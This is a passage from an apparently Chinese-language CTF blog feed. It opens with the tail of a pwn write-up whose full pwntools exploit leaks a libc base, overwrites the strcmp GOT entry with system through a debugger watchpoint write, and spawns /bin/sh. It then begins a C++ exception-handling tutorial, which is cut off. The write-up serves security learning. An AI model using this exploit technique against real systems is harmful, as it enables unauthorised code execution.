int(p.recv(4),16)&#xA;lg(&amp;#34;libc_high&amp;#34;)&#xA;lg(&amp;#34;libc_low&amp;#34;)&#xA;libc_base = (libc_high&amp;lt;&amp;lt;32) | libc_low&#xA;lg(&amp;#34;libc_base&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入system：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;WP *new_wp(){&#xA;    if(free_ == NULL){&#xA;        assert(0);&#xA;    }&#xA;    //unlink&#xA;    WP *temp = free_;&#xA;    free_ = free_-&amp;gt;next;&#xA;    //insert&#xA;    temp-&amp;gt;next = NULL;&#xA;    return temp;&#xA;}&#xA;&#xA;void set_watchpoint(char *args){&#xA;    bool flag = true;&#xA;  uint32_t val = expr(args, &amp;amp;flag);&#xA;&#xA;  if (!flag) {&#xA;    printf(&amp;#34;You input an invalid expression, failed to create watchpoint!&amp;#34;);&#xA;    return ;&#xA;  }  &#xA;&#xA;  WP *wp = new_wp();&#xA;  wp-&amp;gt;old_val = val;&#xA;  memcpy(wp-&amp;gt;exp, args, 30);&#xA;  //...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里可以看到：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;WP *wp = free_;&#xA;memcpy(wp-&amp;gt;exp, args, 30);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也就是&lt;code&gt;w 0xdeedbeef&lt;/code&gt;的时候，会把&lt;code&gt;0xdeedbeef&lt;/code&gt;写入&lt;code&gt;free_+0x30&lt;/code&gt;处&lt;/p&gt;&#xA;&lt;p&gt;这样我们只需要去set free_再w就能实现任意写&lt;/p&gt;&#xA;&lt;p&gt;这里的思路是写strcmp的got为system，在&lt;code&gt;ui_mainloop&lt;/code&gt;中,strcmp的第一个参数就是我们输入的命令，输入binsh就行&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;p&gt;这里我用的本地的libc&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;ru(b&amp;#39;(nemu) &amp;#39;)&#xA;# dbg()&#xA;&#xA;&#xA;#pwndbg&amp;gt; p/x 0x86a3fc8-0x6a3b80&#xA;#$1 = 0x8000448&#xA;sl(b&amp;#39;set 0x8000448 0x60eff0&amp;#39;)&#xA;&#xA;sl(b&amp;#39;info w&amp;#39;)&#xA;ru(b&amp;#39;New Value&amp;#39;)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_low = int(p.recv(8),16)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_high = int(p.recv(4),16)&#xA;lg(&amp;#34;libc_high&amp;#34;)&#xA;lg(&amp;#34;libc_low&amp;#34;)&#xA;libc_base = (libc_high&amp;lt;&amp;lt;32) | libc_low&#xA;libc_base = libc_base -0xadd30&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;sl(b&amp;#39;set 0x8000448 0&amp;#39;)&#xA;# dbg()&#xA;&#xA;system = libc_base &amp;#43; 0x58750&#xA;strcmp_got = 0x60F0F0&#xA;# pwndbg&amp;gt; p &amp;amp;free_&#xA;# $1 = (WP **) 0x86a3fc0 &amp;lt;free_&amp;gt;&#xA;# pwndbg&amp;gt; p/x 0x86a3fc0 - 0x6a3b80&#xA;# $2 = 0x8000440&#xA;sl(b&amp;#39;set 0x8000440 0x60f0c0&amp;#39;)&#xA;sl(b&amp;#39;w &amp;#39;&amp;#43;hex(system).encode())&#xA;sl(b&amp;#39;/bin/sh&amp;#39;)&#xA;&#xA;&#xA;# 0x6a3b80&#xA;itr()&#xA;# x/8gx 0x60f018-0x20&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;做下来，有别于传统的题，又挺有意思的一道题&lt;/p&gt;&#xA;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>C&#43;&#43;pwn之异常处理</title>
      <link>http://localhost:1313/posts/cpp_pwn/</link>
      <pubDate>Thu, 28 Aug 2025 21:51:40 +0800</pubDate>
      <guid>http://localhost:1313/posts/cpp_pwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;异常处理机制&#34;&gt;&lt;span&gt;异常处理机制&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86%e6%9c%ba%e5%88%b6&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;基础语法&#34;&gt;&lt;span&gt;基础语法&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e8%af%ad%e6%b3%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;异常机制中主要的几个关键字：&lt;code&gt;throw&lt;/code&gt; 抛出异常，&lt;code&gt;try-catch&lt;/code&gt;响应异常&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;&#xA;using namespace std;&#xA;&#xA;int main() {&#xA;    int x, y;&#xA;    cout &amp;lt;&amp;lt; &amp;#34;请输入两个整数（x y）：&amp;#34;;&#xA;    cin &amp;gt;&amp;gt; x &amp;gt;&amp;gt; y;&#xA;&#xA;    try {&#xA;        if (y == 0) {&#xA;            // 抛出异常：除数不能为 0&#xA;            throw runtime_error(&amp;#34;除数不能为 0！&amp;#34;);&#xA;        }&#xA;        cout &amp;lt;&amp;lt; &amp;#34;结果: &amp;#34; &amp;lt;&amp;lt; x / y &amp;lt;&amp;lt; endl;&#xA;    } catch (const runtime_error&amp;amp; e) {&#xA;        // 捕获并处理异常&#xA;        cout &amp;lt;&amp;lt; &amp;#34;发生异常：&amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;&#xA;    }&#xA;&#xA;    cout &amp;lt;&amp;lt; &amp;#34;程序继续运行...&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入 &lt;code&gt;10 2&lt;/code&gt; ， 输出 &lt;code&gt;结果: 5&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入&lt;code&gt;10 0&lt;/code&gt;，会输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;发生异常：除数不能为 0！&#xA;程序继续运行...&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;trycatch&#34;&gt;&lt;span&gt;try、catch&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#trycatch&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt; try {&#xA; &#x9;program-statements&#xA; } catch (exception-declaration) {&#xA; &#x9;handler-statements&#xA; } catch (exception-declaration) {&#xA; &#x9;handler-statements&#xA; } // .. . &lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;try块&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;用 &lt;code&gt;try { ... }&lt;/code&gt; 包裹可能产生异常的代码。&lt;/li&gt;&#xA;&lt;li&gt;在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;catch块&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当 try 内抛出异常时，运行时会寻找匹配的 catch。&lt;/li&gt;&#xA;&lt;li&gt;一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;函数退出与栈展开&#34;&gt;&lt;span&gt;函数退出与栈展开&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%87%bd%e6%95%b0%e9%80%80%e5%87%ba%e4%b8%8e%e6%a0%88%e5%b1%95%e5%bc%80&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在复杂的程序中，可能在一个&lt;code&gt;try&lt;/code&gt;语句中嵌套另一个&lt;code&gt;try&lt;/code&gt;语句&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;stack unwinding（栈展开）：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当一个异常被抛出，如果没有对应的&lt;code&gt;catch&lt;/code&gt;能处理，就会终止这个函数，并返回给调用者&lt;/li&gt;&#xA;&lt;li&gt;调用者继续查找自己的 &lt;code&gt;try...catch&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;如果仍未找到 → 再返回上层调用者 … 一直往上追溯&lt;/li&gt;&#xA;&lt;li&gt;如果最终没找到任何合适的 catch ，就会调用标准库函数 &lt;code&gt;terminate()&lt;/code&gt;，程序直接退出&lt;/li&gt;&#xA;&lt;li&gt;如果在某一层找到了匹配的&lt;code&gt;catch&lt;/code&gt;，那么程序就会进入这个&lt;code&gt;catch&lt;/code&gt;块执行，当 &lt;code&gt;catch&lt;/code&gt; 执行完，程序会跳到该 &lt;code&gt;try-catch&lt;/code&gt; 的最后一个 catch 之后继续执行。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;&#xA;#include &amp;lt;stdexcept&amp;gt;&#xA;using namespace std;&#xA;&#xA;void funcC() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcC&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    throw runtime_error(&amp;#34;funcC 出现异常&amp;#34;); // 抛出异常&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcC 正常结束&amp;#34; &amp;lt;&amp;lt; endl;       // 不会执行&#xA;}&#xA;&#xA;void funcB() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcB&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    funcC(); // 调用 funcC&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcB 正常结束&amp;#34; &amp;lt;&amp;lt; endl; // 不会执行&#xA;}&#xA;&#xA;void funcA() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcA&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    try {&#xA;        funcB(); // 调用 funcB&#xA;    } catch (const runtime_error&amp;amp; e) {&#xA;        cout &amp;lt;&amp;lt; &amp;#34;捕获异常: &amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;&#xA;    }&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcA 继续执行&amp;#34; &amp;lt;&amp;lt; endl;&#xA;}&#xA;&#xA;int main() {&#xA;    funcA();&#xA;    cout &amp;lt;&amp;lt; &amp;#34;main 继续执行&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出结果：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;进入 funcA&#xA;进入 funcB&#xA;进入 funcC&#xA;捕获异常: funcC 出现异常&#xA;funcA 继续执行&#xA;main 继续执行&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;raii&#34;&gt;&lt;span&gt;RAII&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#raii&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;C&lt;ins&gt;异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C&lt;/ins&gt; 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;把资源放到对象里（比如 &lt;code&gt;std::vector&lt;/code&gt; 自动释放内存）&lt;/li&gt;&#xA;&lt;li&gt;这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;高级异常机制&#34;&gt;&lt;span&gt;高级异常机制&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%ab%98%e7%ba%a7%e5%bc%82%e5%b8%b8%e6%9c%ba%e5%88%b6&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;当一个异常被&lt;code&gt;throw&lt;/code&gt;时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的&lt;code&gt;catch&lt;/code&gt;中，这会导致：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在跳转过程中，调用栈上沿途的函数会被退出&lt;/li&gt;&#xA;&lt;li&gt;退出时，局部对象会正常调用析构函数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;对象销毁&#34;&gt;&lt;span&gt;对象销毁&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%b9%e8%b1%a1%e9%94%80%e6%af%81&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;当 &lt;code&gt;throw&lt;/code&gt; 发生时，函数会提前退出，局部对象（local objects）会自动销毁&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;类对象&lt;/strong&gt;：编译器会自动调用它们的析构函数&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;构造函数中异常&lt;/strong&gt;：类本身的析构函数不会执行，但已经成功构造的成员会被析构&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;数组 / 容器异常&lt;/strong&gt;：已经构造的元素会被析构，未构造的不会&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;内置类型&lt;/strong&gt;：不需要析构，退出时只是栈帧释放。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;析构函数与异常&#34;&gt;&lt;span&gt;析构函数与异常&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%9e%90%e6%9e%84%e5%87%bd%e6%95%b0%e4%b8%8e%e5%bc%82%e5%b8%b8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 &lt;code&gt;std::terminate()&lt;/code&gt;，程序立刻结束&lt;/p&gt;&#xA;&lt;p&gt;如：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct Bad {&#xA;    ~Bad() {&#xA;        throw std::runtime_error(&amp;#34;oops in destructor&amp;#34;); // 危险！&#xA;    }&#xA;};&#xA;&#xA;int main() {&#xA;    try {&#xA;        Bad b;&#xA;        throw std::runtime_error(&amp;#34;main error&amp;#34;);&#xA;    } catch (...) {&#xA;        std::cout &amp;lt;&amp;lt; &amp;#34;Caught exception\n&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以，析构函数如果会抛出异常，需要用&lt;code&gt;try-catch&lt;/code&gt;把他包起来，不能让异常传播出去&lt;/p&gt;&#xA;&lt;p&gt;如&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct Good {&#xA;    ~Good() {&#xA;        try {&#xA;            // 某些可能抛异常的操作&#xA;            throw std::runtime_error(&amp;#34;oops in destructor&amp;#34;);&#xA;        } catch (...) {&#xA;            // 在这里处理，不能让它继续抛&#xA;            std::cerr &amp;lt;&amp;lt; &amp;#34;Exception caught in destructor\n&amp;#34;;&#xA;        }&#xA;    }&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;throw&#34;&gt;&lt;span&gt;throw&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#throw&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;异常对象的构建&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;throw std::runtime_error(&amp;#34;Something bad 